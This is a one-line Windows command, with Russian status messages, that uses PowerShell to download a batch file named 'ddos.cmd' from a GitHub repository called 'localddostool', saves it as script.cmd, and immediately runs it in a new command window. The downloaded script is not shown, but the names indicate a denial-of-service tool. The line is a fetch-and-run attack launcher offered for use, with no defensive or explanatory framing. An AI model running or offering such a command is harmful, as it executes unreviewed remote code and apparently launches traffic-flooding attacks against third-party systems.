powershell -Command "try { $content = (Invoke-WebRequest 'https://raw.githubusercontent.com/harikton/localddostool/refs/heads/main/ddos.cmd').Content; $content = $content -replace \"`n\", \"`r`n\"; [System.IO.File]::WriteAllText('script.cmd', $content, [System.Text.Encoding]::UTF8); echo 'Скрипт успешно скачан' } catch { echo 'Ошибка скачивания:' $_ }" && start cmd.exe /k script.cmd && exit /b
